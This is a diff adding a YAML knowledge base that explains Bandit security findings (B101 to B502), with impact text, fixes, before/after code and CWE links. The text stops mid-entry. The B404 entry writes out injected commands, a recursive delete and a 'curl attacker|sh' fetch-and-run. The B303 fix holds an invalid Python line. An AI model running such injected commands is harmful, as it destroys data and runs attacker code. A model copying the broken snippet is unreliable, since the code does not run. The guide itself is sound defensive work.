@@ -1,0 +1,1510 @@
+# Enrichment knowledge base for Bandit (section 6).
+# One entry per Bandit test ID (bandit 1.9.4 registry, B101..B704).
+# Impact text describes consequences for the application, never a restatement
+# of the rule. Fix text is actionable and carries a short before/after where
+# it makes sense. A test fails if any ID below is missing or empty.
+
+B101:
+  title: Assert used
+  description: >
+    An assert statement was found. Asserts are removed when Python runs with
+    optimization (-O), so they never count as validation.
+  impact: >
+    If the application is ever run with -O, every check written as an assert
+    silently disappears: input that should have been rejected flows straight
+    into the code behind it, and the guard you thought you had is gone.
+  fix: |
+    Raise an explicit exception instead of asserting:
+
+    ```python
+    # before
+    assert user is not None
+
+    # after
+    if user is None:
+        raise HTTPException(status_code=401, detail="Authentication required")
+    ```
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/asserts.py
+    - https://cwe.mitre.org/data/definitions/617.html
+  cwe: CWE-617
+
+B102:
+  title: Exec used
+  description: >
+    The exec built-in runs a string as Python code. If any part of that string
+    comes from outside the program, the caller is handed the interpreter.
+  impact: >
+    If an attacker can influence the string, they can run arbitrary commands
+    on the server with the privileges of the application - read the database,
+    open a reverse shell, wipe files.
+  fix: |
+    Replace exec with an explicit dispatch - a dict of functions or an
+    if/elif chain, so no string is ever evaluated as code:
+
+    ```python
+    # before
+    exec(action + "()")
+
+    # after
+    handlers = {"refresh": refresh, "reset": reset}
+    handlers[action]()
+    ```
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/exec.py
+    - https://cwe.mitre.org/data/definitions/94.html
+  cwe: CWE-94
+
+B103:
+  title: Bad file permissions set
+  description: >
+    A file or directory is created or changed with permissions wider than
+    owner-only access, often via os.chmod or os.makedirs with a permissive
+    mode.
+  impact: >
+    Any local user or process on the host can read - and for world-writable
+    files, modify - whatever lands there: configuration, keys, session data,
+    uploaded files.
+  fix: |
+    Keep sensitive paths at 0o600 for files and 0o700 for directories:
+
+    ```python
+    # before
+    open(path, "w").write(secret)
+    os.chmod(path, 0o666)
+
+    # after
+    fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
+    with os.fdopen(fd, "w") as handle:
+        handle.write(secret)
+    ```
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/general_bad_file_permissions.py
+    - https://cwe.mitre.org/data/definitions/732.html
+  cwe: CWE-732
+
+B104:
+  title: Hardcoded bind to all interfaces
+  description: >
+    A server is started on 0.0.0.0 or ::, which accepts connections from
+    every network interface, including any the operator did not intend to
+    expose.
+  impact: >
+    The service is reachable from any network the host is attached to. On a
+    cloud instance or a developer laptop that means the internet or the local
+    LAN can reach a service that was only ever meant for localhost.
+  fix: >
+    Bind to an explicit address. Use 127.0.0.1 for local-only services and a
+    specific interface address when the service must be reached elsewhere;
+    let the reverse proxy own the public 0.0.0.0 binding.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/general_bind_all_interfaces.py
+    - https://cwe.mitre.org/data/definitions/668.html
+  cwe: CWE-668
+
+B105:
+  title: Hardcoded password string
+  description: >
+    A variable whose name suggests it holds a password is assigned a literal
+    value in the source.
+  impact: >
+    The credential ships in the source code: everyone with repository access
+    has it, it lives on in every fork and mirror, and rotating it means a new
+    release. Anything the password protects is only as private as the repo.
+  fix: >
+    Read the password from the environment or a secret manager at startup and
+    fail fast when it is missing:
+    `password = os.environ["DB_PASSWORD"]` - never a literal.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/general_hardcoded_password.py
+    - https://cwe.mitre.org/data/definitions/798.html
+  cwe: CWE-798
+
+B106:
+  title: Hardcoded password in function argument
+  description: >
+    A function argument whose name suggests a password has a literal default
+    or is passed a literal at the call site.
+  impact: >
+    The default value is visible to anyone reading the source and to every
+    caller that forgets to override it, so the shared credential quietly
+    protects production systems too.
+  fix: >
+    Make the argument required with no default and pass the value in from the
+    environment: `def connect(password: str) -> ...` with callers doing
+    `connect(os.environ["DB_PASSWORD"])`.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/general_hardcoded_password.py
+    - https://cwe.mitre.org/data/definitions/798.html
+  cwe: CWE-798
+
+B107:
+  title: Hardcoded password in default argument
+  description: >
+    A function defines a literal default value for an argument whose name
+    suggests it is a password.
+  impact: >
+    Anyone who calls the function without the argument silently uses the
+    built-in credential, and the literal is readable in the source. The
+    fallback becomes the real password in production.
+  fix: |
+    Use `None` as the default and require a real value:
+
+    ```python
+    # before
+    def connect(password="hunter2"): ...
+
+    # after
+    def connect(password: str | None = None):
+        if password is None:
+            raise ValueError("password must be provided")
+    ```
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/general_hardcoded_password.py
+    - https://cwe.mitre.org/data/definitions/798.html
+  cwe: CWE-798
+
+B108:
+  title: Hardcoded temporary directory
+  description: >
+    A fixed path under /tmp or another shared temporary directory is used for
+    files the application creates or trusts.
+  impact: >
+    /tmp is shared by every user on the host: another local user can pre-create
+    the path, symlink it at something the application trusts, and read or
+    replace whatever the application writes there (a classic symlink race).
+  fix: |
+    Use the tempfile module, which creates a private directory atomically:
+
+    ```python
+    # before
+    path = "/tmp/myapp-cache"
+
+    # after
+    with tempfile.TemporaryDirectory(prefix="myapp-") as path:
+        ...
+    ```
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/general_hardcoded_tmp.py
+    - https://cwe.mitre.org/data/definitions/377.html
+  cwe: CWE-377
+
+B110:
+  title: Try, except, pass
+  description: >
+    An except block contains only pass, so the exception is swallowed without
+    a trace.
+  impact: >
+    Failures disappear silently: a permission error, an expired token or a
+    corrupt file is ignored and the program continues with half-initialized
+    state, making the real fault surface much later as unrelated behaviour.
+  fix: |
+    Handle the exception or let it propagate; log it if you must continue:
+
+    ```python
+    # before
+    try:
+        cleanup()
+    except Exception:
+        pass
+
+    # after
+    try:
+        cleanup()
+    except OSError:
+        logger.warning("cleanup failed", exc_info=True)
+    ```
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/try_except_pass.py
+    - https://cwe.mitre.org/data/definitions/755.html
+  cwe: CWE-755
+
+B112:
+  title: Try, except, continue
+  description: >
+    An except block contains only continue, so the failing iteration is
+    skipped and the loop carries on as if nothing happened.
+  impact: >
+    Items are silently dropped: one broken record in a batch means missing
+    writes or skipped validations, and no error ever reaches the logs or the
+    operator.
+  fix: >
+    Log the failure with the item that failed and decide explicitly whether
+    the loop should continue or abort - `logger.exception("skipping record %s", id)`
+    keeps the loss observable.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/try_except_continue.py
+    - https://cwe.mitre.org/data/definitions/755.html
+  cwe: CWE-755
+
+B113:
+  title: Request without timeout
+  description: >
+    An HTTP request is made without a timeout argument, so the connection or
+    the response may take unboundedly long.
+  impact: >
+    One slow or hostile endpoint ties up a worker forever: request threads
+    pile up, the queue grows, and the whole service times out for real users
+    while it waits on a server that will never answer.
+  fix: |
+    Always pass a timeout, and prefer a connect/read pair:
+
+    ```python
+    # before
+    requests.get(url)
+
+    # after
+    requests.get(url, timeout=(3.05, 30))
+    ```
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/request_without_timeout.py
+    - https://cwe.mitre.org/data/definitions/400.html
+  cwe: CWE-400
+
+B201:
+  title: Flask debug mode enabled
+  description: >
+    A Flask application is started with debug=True, which enables the
+    interactive debugger and the reloader.
+  impact: >
+    The Werkzeug debugger exposes an interactive console in the browser on
+    unhandled errors - anyone who can trigger an exception gets a Python
+    shell on the server and full command execution.
+  fix: >
+    Never hardcode debug=True. Drive it from configuration that is false in
+    production: `app.run(debug=os.environ.get("FLASK_DEBUG") == "1")`, and
+    keep the reloader off behind a real WSGI server.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/app_debug.py
+    - https://cwe.mitre.org/data/definitions/489.html
+  cwe: CWE-489
+
+B202:
+  title: Tarfile unsafe members
+  description: >
+    A tar archive is extracted without filtering its members, so entries with
+    absolute paths or `..` segments are written where the archive says.
+  impact: >
+    A crafted archive writes files outside the destination - overwriting
+    `~/.ssh/authorized_keys`, a cron job, or an application module - which is
+    remote code execution reached purely through an upload.
+  fix: |
+    Filter members before extraction (Python 3.12 has a built-in filter):
+
+    ```python
+    # before
+    tar.extractall(path=dest)
+
+    # after
+    tar.extractall(path=dest, filter="data")
+    ```
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/tarfile_unsafe_members.py
+    - https://cwe.mitre.org/data/definitions/22.html
+  cwe: CWE-22
+
+B301:
+  title: Pickle used
+  description: >
+    pickle.loads, pickle.load or a wrapper such as dill or jsonpickle
+    deserializes data. A pickle stream is a program: loading one executes
+    whatever instructions it carries.
+  impact: >
+    If an attacker can supply or modify the bytes - a cache, a cookie, a
+    file upload, a message on a queue - loading them runs arbitrary code on
+    the server with the application's privileges.
+  fix: >
+    Do not unpickle untrusted data. Use JSON for data interchange; if you
+    need object graphs, use a format without code execution (protobuf,
+    msgpack) or sign the payload with HMAC and verify before loading.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/blacklists/calls.py
+    - https://cwe.mitre.org/data/definitions/502.html
+  cwe: CWE-502
+
+B302:
+  title: Marshal used
+  description: >
+    The marshal module deserializes a byte stream back into Python objects
+    and, like pickle, is not safe against manipulated input.
+  impact: >
+    Crafted marshal data can crash the interpreter or corrupt what the
+    program believes it loaded, and the format is version-specific, so
+    loading it from users or across Python versions is unbounded trust.
+  fix: >
+    Use JSON or another data-only format for anything that leaves the
+    process. Reserve marshal for Python's own code caching (pyc files).
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/blacklists/calls.py
+    - https://cwe.mitre.org/data/definitions/502.html
+  cwe: CWE-502
+
+B303:
+  title: Insecure hash function used
+  description: >
+    MD2, MD4, MD5 or SHA1 is used for hashing. These hashes are broken:
+    collisions can be computed in seconds.
+  impact: >
+    Where the hash proves integrity or identity - passwords, signatures,
+    content addressing, session tokens - an attacker who can craft a
+    collision makes malicious data hash the same as trusted data, defeating
+    the check.
+  fix: |
+    Use SHA-256 or better for integrity, and a password KDF for passwords:
+
+    ```python
+    # before
+    digest = hashlib.md5(payload).hexdigest()
+
+    # after
+    digest = hashlib.sha256(payload).hexdigest()
+    # passwords:
+    pwd_hash = argon2-cffi's hash_password(payload)
+    ```
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/blacklists/calls.py
+    - https://cwe.mitre.org/data/definitions/327.html
+  cwe: CWE-327
+
+B304:
+  title: Insecure cipher used
+  description: >
+    A cipher that cryptography considers insecure - such as DES, 3DES or RC4
+    - is used for encryption.
+  impact: >
+    The encryption can be broken with commodity hardware: an attacker who
+    captures the traffic recovers the plaintext, so confidentiality of
+    anything sent through this cipher is effectively gone.
+  fix: >
+    Use an authenticated modern cipher - AES-GCM via the cryptography
+    library's Fernet or ChaCha20-Poly1305 - and stop at the library's
+    defaults rather than choosing a cipher by hand.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/blacklists/calls.py
+    - https://cwe.mitre.org/data/definitions/327.html
+  cwe: CWE-327
+
+B305:
+  title: Insecure cipher mode used
+  description: >
+    A block cipher mode cryptography marks as insecure - ECB or a bare CBC
+    without authentication - is in use.
+  impact: >
+    ECB leaks structure: identical plaintext blocks encrypt identically, so
+    patterns in the data survive the ciphertext, and unauthenticated modes
+    let an attacker flip bits in the plaintext by editing the ciphertext.
+  fix: >
+    Use AES-GCM or another authenticated mode, which encrypts and
+    authenticates in one step: `cryptography`'s Fernet is the simplest
+    correct choice in Python.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/blacklists/calls.py
+    - https://cwe.mitre.org/data/definitions/327.html
+  cwe: CWE-327
+
+B306:
+  title: Insecure mktemp used
+  description: >
+    tempfile.mktemp only generates a name; it does not create the file, so
+    another process can claim the path between the call and the open.
+  impact: >
+    A local attacker who wins the race creates the file first - often a
+    symlink - and the application then reads or writes an attacker-chosen
+    location, leaking secrets or corrupting trusted files.
+  fix: |
+    Use mkstemp, which creates the file atomically and returns an open
+    descriptor:
+
+    ```python
+    # before
+    path = tempfile.mktemp()
+    open(path, "w").write(data)
+
+    # after
+    fd, path = tempfile.mkstemp()
+    with os.fdopen(fd, "w") as handle:
+        handle.write(data)
+    ```
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/blacklists/calls.py
+    - https://cwe.mitre.org/data/definitions/377.html
+  cwe: CWE-377
+
+B307:
+  title: Eval used
+  description: >
+    The eval built-in evaluates a string as a Python expression.
+  impact: >
+    If any part of the string is attacker-controlled, eval executes arbitrary
+    code on the server - read the environment, open a shell, modify data -
+    with no sandbox between the input and the interpreter.
+  fix: |
+    Parse instead of evaluating. For literals use ast.literal_eval, for
+    structured data use json.loads:
+
+    ```python
+    # before
+    value = eval(user_input)
+
+    # after
+    value = ast.literal_eval(user_input)  # literals only, no calls
+    ```
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/blacklists/calls.py
+    - https://cwe.mitre.org/data/definitions/78.html
+  cwe: CWE-78
+
+B308:
+  title: Django mark_safe used
+  description: >
+    mark_safe tells Django's template engine to trust a string as already
+    safe HTML, bypassing autoescaping for that value.
+  impact: >
+    Any HTML the value contains is rendered verbatim: if part of it came
+    from a user, that is stored or reflected cross-site scripting -
+    session theft, actions performed as the victim.
+  fix: |
+    Escape the parts that are data and mark only the structure safe:
+
+    ```python
+    # before
+    return mark_safe("<b>" + user_input + "</b>")
+
+    # after
+    return format_html("<b>{}</b>", user_input)
+    ```
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/blacklists/calls.py
+    - https://cwe.mitre.org/data/definitions/79.html
+  cwe: CWE-79
+
+B310:
+  title: Urllib urlopen with a scheme
+  description: >
+    urllib.request.urlopen is called with a URL whose scheme is checked, at
+    best. file:// and custom schemes let the call read local files or reach
+    internal handlers instead of the network.
+  impact: >
+    If an attacker influences the URL they may read arbitrary local files
+    through file:// (application code, keys, /etc/passwd) or trigger
+    unexpected protocol handlers, turning a "fetch a URL" feature into local
+    file disclosure.
+  fix: >
+    Parse the URL and allow only http and https for user-supplied hosts, or
+    use the requests library with an explicit allowlist of schemes and
+    destinations.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/blacklists/calls.py
+    - https://cwe.mitre.org/data/definitions/22.html
+  cwe: CWE-22
+
+B311:
+  title: Random generator used for security
+  description: >
+    The random module's Mersenne Twister is used where security matters.
+    random is deterministic and predictable from its output.
+  impact: >
+    An attacker who observes a few outputs can reconstruct the internal state
+    and predict every future value: session tokens, password reset links and
+    CSRF tokens become guessable.
+  fix: |
+    Use the cryptographically secure secrets module:
+
+    ```python
+    # before
+    token = "".join(random.choice(ALPHABET) for _ in range(32))
+
+    # after
+    token = secrets.token_urlsafe(32)
+    ```
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/blacklists/calls.py
+    - https://cwe.mitre.org/data/definitions/330.html
+  cwe: CWE-330
+
+B312:
+  title: Telnet function used
+  description: >
+    A telnetlib function is called. Telnet transmits everything, including
+    credentials, in cleartext and offers no integrity protection.
+  impact: >
+    Anyone on the network path reads the session as it passes: usernames,
+    passwords and command output are visible to a passive sniffer, and the
+    session can be modified in transit.
+  fix: >
+    Speak SSH instead - paramiko for programmatic connections - or use an
+    API over TLS. There is no safe way to harden telnet itself.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/blacklists/calls.py
+    - https://cwe.mitre.org/data/definitions/319.html
+  cwe: CWE-319
+
+B313:
+  title: Insecure XML parser used (cElementTree)
+  description: >
+    xml.etree.cElementTree parses XML without defusing external entities, so
+    a crafted document can trigger XXE against the process.
+  impact: >
+    A crafted XML document makes the parser fetch external entities: read
+    local files into the parsed result, reach internal HTTP endpoints from
+    the server (SSRF), or exhaust memory with entity expansion (billion
+    laughs).
+  fix: >
+    Parse untrusted XML with defusedxml, or build the parser with external
+    entity resolution explicitly disabled before handing it untrusted input.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/blacklists/calls.py
+    - https://cwe.mitre.org/data/definitions/20.html
+  cwe: CWE-20
+
+B314:
+  title: Insecure XML parser used (ElementTree)
+  description: >
+    xml.etree.ElementTree parses XML without defusing external entities, so a
+    crafted document can trigger XXE against the process.
+  impact: >
+    A crafted XML document makes the parser fetch external entities: read
+    local files into the parsed result, reach internal HTTP endpoints from
+    the server (SSRF), or exhaust memory with entity expansion (billion
+    laughs).
+  fix: >
+    Parse untrusted XML with defusedxml, or build the parser with external
+    entity resolution explicitly disabled before handing it untrusted input.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/blacklists/calls.py
+    - https://cwe.mitre.org/data/definitions/20.html
+  cwe: CWE-20
+
+B315:
+  title: Insecure XML parser used (expat reader)
+  description: >
+    An xmlreader-based parser consumes XML without defusing external
+    entities, so a crafted document can trigger XXE against the process.
+  impact: >
+    A crafted XML document makes the parser fetch external entities: read
+    local files into the parsed result, reach internal HTTP endpoints from
+    the server (SSRF), or exhaust memory with entity expansion (billion
+    laughs).
+  fix: >
+    Parse untrusted XML with defusedxml, or build the parser with external
+    entity resolution explicitly disabled before handing it untrusted input.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/blacklists/calls.py
+    - https://cwe.mitre.org/data/definitions/20.html
+  cwe: CWE-20
+
+B316:
+  title: Insecure XML parser used (expat builder)
+  description: >
+    xml.dom.minidom's expat builder parses XML without defusing external
+    entities, so a crafted document can trigger XXE against the process.
+  impact: >
+    A crafted XML document makes the parser fetch external entities: read
+    local files into the parsed result, reach internal HTTP endpoints from
+    the server (SSRF), or exhaust memory with entity expansion (billion
+    laughs).
+  fix: >
+    Parse untrusted XML with defusedxml, or build the parser with external
+    entity resolution explicitly disabled before handing it untrusted input.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/blacklists/calls.py
+    - https://cwe.mitre.org/data/definitions/20.html
+  cwe: CWE-20
+
+B317:
+  title: Insecure XML parser used (SAX)
+  description: >
+    The xml.sax parser processes XML without defusing external entities, so a
+    crafted document can trigger XXE against the process.
+  impact: >
+    A crafted XML document makes the parser fetch external entities: read
+    local files into the parsed result, reach internal HTTP endpoints from
+    the server (SSRF), or exhaust memory with entity expansion (billion
+    laughs).
+  fix: >
+    Parse untrusted XML with defusedxml, or set
+    `feature_external_ges`/`feature_external_pes` to False on the SAX parser
+    before parsing untrusted input.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/blacklists/calls.py
+    - https://cwe.mitre.org/data/definitions/20.html
+  cwe: CWE-20
+
+B318:
+  title: Insecure XML parser used (minidom)
+  description: >
+    xml.dom.minidom parses XML without defusing external entities, so a
+    crafted document can trigger XXE against the process.
+  impact: >
+    A crafted XML document makes the parser fetch external entities: read
+    local files into the parsed result, reach internal HTTP endpoints from
+    the server (SSRF), or exhaust memory with entity expansion (billion
+    laughs).
+  fix: >
+    Parse untrusted XML with defusedxml, or build the parser with external
+    entity resolution explicitly disabled before handing it untrusted input.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/blacklists/calls.py
+    - https://cwe.mitre.org/data/definitions/20.html
+  cwe: CWE-20
+
+B319:
+  title: Insecure XML parser used (pulldom)
+  description: >
+    xml.dom.pulldom parses XML without defusing external entities, so a
+    crafted document can trigger XXE against the process.
+  impact: >
+    A crafted XML document makes the parser fetch external entities: read
+    local files into the parsed result, reach internal HTTP endpoints from
+    the server (SSRF), or exhaust memory with entity expansion (billion
+    laughs).
+  fix: >
+    Parse untrusted XML with defusedxml, or build the parser with external
+    entity resolution explicitly disabled before handing it untrusted input.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/blacklists/calls.py
+    - https://cwe.mitre.org/data/definitions/20.html
+  cwe: CWE-20
+
+B321:
+  title: FTP function used
+  description: >
+    An ftplib function is called. FTP transmits credentials and file data in
+    cleartext and has no integrity protection.
+  impact: >
+    A passive observer on the network path captures usernames, passwords and
+    file contents as they pass, and can modify transfers in transit without
+    either side noticing.
+  fix: >
+    Use SFTP over SSH (paramiko), SCP, or an HTTPS endpoint instead of plain
+    FTP. There is no way to make ftplib itself confidential.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/blacklists/calls.py
+    - https://cwe.mitre.org/data/definitions/319.html
+  cwe: CWE-319
+
+B323:
+  title: Unverified SSL context
+  description: >
+    An SSL context is created with certificate verification disabled
+    (check_hostname=False and/or verify_mode=CERT_NONE).
+  impact: >
+    Any machine able to intercept the connection presents any certificate and
+    is accepted: the encryption protects nothing, because the attacker is
+    the endpoint - classic man-in-the-middle reading and modifying the
+    traffic.
+  fix: |
+    Keep verification on. To trust a private CA, load it explicitly instead
+    of disabling the check:
+
+    ```python
+    # before
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+
+    # after
+    ctx.load_verify_locations("/etc/ssl/certs/internal-ca.pem")
+    ```
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/blacklists/calls.py
+    - https://cwe.mitre.org/data/definitions/295.html
+  cwe: CWE-295
+
+B324:
+  title: Insecure hash function in hashlib
+  description: >
+    hashlib is asked for MD2, MD4, MD5 or SHA1 - hashes with known collision
+    attacks.
+  impact: >
+    Where the hash stands in for integrity or identity, an attacker who can
+    craft a collision makes malicious input hash the same as trusted input,
+    so the verification passes for data they chose.
+  fix: |
+    Ask hashlib for a modern digest:
+
+    ```python
+    # before
+    hashlib.new("md5", payload).hexdigest()
+
+    # after
+    hashlib.sha256(payload).hexdigest()
+    ```
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/hashlib_insecure_functions.py
+    - https://cwe.mitre.org/data/definitions/327.html
+  cwe: CWE-327
+
+B401:
+  title: Telnet module imported
+  description: >
+    The telnetlib module is imported. Telnet is a cleartext protocol with no
+    authentication hardening.
+  impact: >
+    Code that talks telnet exposes credentials and session data to any
+    observer on the network path, and the session itself can be rewritten in
+    transit.
+  fix: >
+    Replace the connection with SSH (paramiko) or an HTTPS-based API; delete
+    the telnetlib import and the code paths that use it.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/blacklists/imports.py
+    - https://cwe.mitre.org/data/definitions/319.html
+  cwe: CWE-319
+
+B402:
+  title: FTP module imported
+  description: >
+    The ftplib module is imported. FTP sends usernames, passwords and file
+    contents in cleartext.
+  impact: >
+    Transfers through plain FTP are readable and writable by anyone on the
+    network path, so credentials and files lose confidentiality and
+    integrity in one place.
+  fix: >
+    Move to SFTP over SSH (paramiko) or an HTTPS endpoint and drop ftplib.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/blacklists/imports.py
+    - https://cwe.mitre.org/data/definitions/319.html
+  cwe: CWE-319
+
+B403:
+  title: Pickle module imported
+  description: >
+    The pickle module (or a wrapper such as dill or shelve) is imported.
+    Unpickling executes code from the data.
+  impact: >
+    Wherever the imported loader later reads bytes from - a cache, a file, a
+    queue - attacker-supplied data becomes arbitrary code execution on the
+    server.
+  fix: >
+    Deserialize with JSON, msgpack or protobuf instead. If you must keep
+    pickle for internal caches, sign the payload and verify before loading,
+    and never read pickle data from outside the process.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/blacklists/imports.py
+    - https://cwe.mitre.org/data/definitions/502.html
+  cwe: CWE-502
+
+B404:
+  title: Subprocess module imported
+  description: >
+    The subprocess module is imported. Every call site in front of it is a
+    potential command injection if shell semantics or untrusted arguments
+    reach it.
+  impact: >
+    If any argument reaches the command line from user input, an attacker
+    appends `; rm -rf /` or `&& curl attacker|sh` and runs their own commands
+    as the application user.
+  fix: >
+    Call subprocess with a list of arguments and shell=False (the default),
+    validate or allowlist any argument that came from outside, and prefer
+    in-process APIs over shelling out.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/blacklists/imports.py
+    - https://cwe.mitre.org/data/definitions/78.html
+  cwe: CWE-78
+
+B405:
+  title: XML etree module imported
+  description: >
+    An xml.etree module is imported for parsing. Its default parsers do not
+    defend against external entity attacks.
+  impact: >
+    Parsing a crafted document can read local files into the result, call
+    internal HTTP endpoints from the server (SSRF), or exhaust memory via
+    entity expansion.
+  fix: >
+    Import defusedxml.ElementTree for untrusted input, or configure the
+    parser with external entities disabled before parsing anything that left
+    your trust boundary.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/blacklists/imports.py
+    - https://cwe.mitre.org/data/definitions/20.html
+  cwe: CWE-20
+
+B406:
+  title: XML sax module imported
+  description: >
+    The xml.sax module is imported. Its parser processes external entities
+    unless explicitly told not to.
+  impact: >
+    Parsing a crafted document can read local files into the result, call
+    internal HTTP endpoints from the server (SSRF), or exhaust memory via
+    entity expansion.
+  fix: >
+    Use defusedxml.sax for untrusted input, or turn off
+    `feature_external_ges`/`feature_external_pes` on the parser before use.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/blacklists/imports.py
+    - https://cwe.mitre.org/data/definitions/20.html
+  cwe: CWE-20
+
+B407:
+  title: XML expat module imported
+  description: >
+    The xml.parsers.expat module is imported. Expat resolves external
+    entities unless the application opts out.
+  impact: >
+    Parsing a crafted document can read local files into the result, call
+    internal HTTP endpoints from the server (SSRF), or exhaust memory via
+    entity expansion.
+  fix: >
+    Use defusedxml.expat for untrusted input, or set
+    `parser.ExpatParser.Create` external entity handling off before parsing.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/blacklists/imports.py
+    - https://cwe.mitre.org/data/definitions/20.html
+  cwe: CWE-20
+
+B408:
+  title: XML minidom module imported
+  description: >
+    The xml.dom.minidom module is imported. Its parser processes external
+    entities unless defused.
+  impact: >
+    Parsing a crafted document can read local files into the result, call
+    internal HTTP endpoints from the server (SSRF), or exhaust memory via
+    entity expansion.
+  fix: >
+    Use defusedxml.minidom for untrusted input, or disable external entity
+    resolution on the parser before parsing.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/blacklists/imports.py
+    - https://cwe.mitre.org/data/definitions/20.html
+  cwe: CWE-20
+
+B409:
+  title: XML pulldom module imported
+  description: >
+    The xml.dom.pulldom module is imported. Its parser processes external
+    entities unless defused.
+  impact: >
+    Parsing a crafted document can read local files into the result, call
+    internal HTTP endpoints from the server (SSRF), or exhaust memory via
+    entity expansion.
+  fix: >
+    Use defusedxml.pulldom for untrusted input, or disable external entity
+    resolution on the parser before parsing.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/blacklists/imports.py
+    - https://cwe.mitre.org/data/definitions/20.html
+  cwe: CWE-20
+
+B411:
+  title: xmlrpclib module imported
+  description: >
+    The XML-RPC client module is imported. XML-RPC parses XML responses and
+    transmits calls without transport security by default.
+  impact: >
+    Responses parsed without defused XML can trigger XXE against your
+    process, and cleartext XML-RPC calls expose payloads to anyone on the
+    path.
+  fix: >
+    Prefer a JSON API over HTTPS. If you must speak XML-RPC, wrap the
+    transport in TLS and parse with defusedxml.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/blacklists/imports.py
+    - https://cwe.mitre.org/data/definitions/20.html
+  cwe: CWE-20
+
+B412:
+  title: Httpoxy-prone module imported
+  description: >
+    A module affected by httpoxy (such as fcgi or the CGI-oriented parts of
+    requests) is imported. HTTP_PROXY taken from request headers routes
+    traffic through an attacker-chosen proxy.
+  impact: >
+    If environment variables are populated from request headers, an attacker
+    sets Proxy and the application's outbound HTTP goes to their server,
+    where they can read and rewrite it (SSRF through your own proxy).
+  fix: >
+    Never populate proxy environment variables from request headers, ignore
+    Proxy headers, and configure proxies explicitly in code.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/blacklists/imports.py
+    - https://cwe.mitre.org/data/definitions/284.html
+  cwe: CWE-284
+
+B413:
+  title: PyCrypto module imported
+  description: >
+    The PyCrypto library is imported. It is unmaintained, contains known
+    vulnerabilities and never received the fixes a crypto library needs.
+  impact: >
+    Known flaws in PyCrypto - including the long-standing CVE in its ECB
+    handling - stay unpatched in your application, so its encryption is
+    weaker than it advertises.
+  fix: >
+    Migrate to the `cryptography` package: it is maintained, its high-level
+    primitives (Fernet, AESGCM, ChaCha20Poly1305) are hard to misuse, and
+    migrations are usually a small mechanical change.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/blacklists/imports.py
+    - https://cwe.mitre.org/data/definitions/327.html
+  cwe: CWE-327
+
+B415:
+  title: pyghmi module imported
+  description: >
+    The pyghmi module (IPMI client library) is imported. IPMI transmits
+    credentials and data with weak, often cleartext, protection.
+  impact: >
+    IPMI sessions expose BMC credentials and management traffic to anyone who
+    can see the network, and the BMC is a device that is on even when the
+    server is off.
+  fix: >
+    Manage hosts through an encrypted channel - SSH, an HTTPS API, or the
+    vendor's authenticated management interface - instead of raw IPMI.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/blacklists/imports.py
+    - https://cwe.mitre.org/data/definitions/319.html
+  cwe: CWE-319
+
+B501:
+  title: Request with certificate validation disabled
+  description: >
+    An HTTP request is made with certificate verification turned off
+    (verify=False).
+  impact: >
+    Any machine able to sit in the network path terminates the TLS session
+    with a self-signed certificate and is accepted: the request's data and
+    the response it trusts both belong to the attacker.
+  fix: |
+    Leave verification on and fix the trust problem directly:
+
+    ```python
+    # before
+    requests.get(url, verify=False)
+
+    # after
+    requests.get(url)  # or verify="/etc/ssl/certs/internal-ca.pem"
+    ```
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/crypto_request_no_cert_validation.py
+    - https://cwe.mitre.org/data/definitions/295.html
+  cwe: CWE-295
+
+B502:
+  title: Bad SSL version used
+  description: >
+    A TLS version cryptography marks as weak (SSL 2.0, SSL 3.0, TLS 1.0,
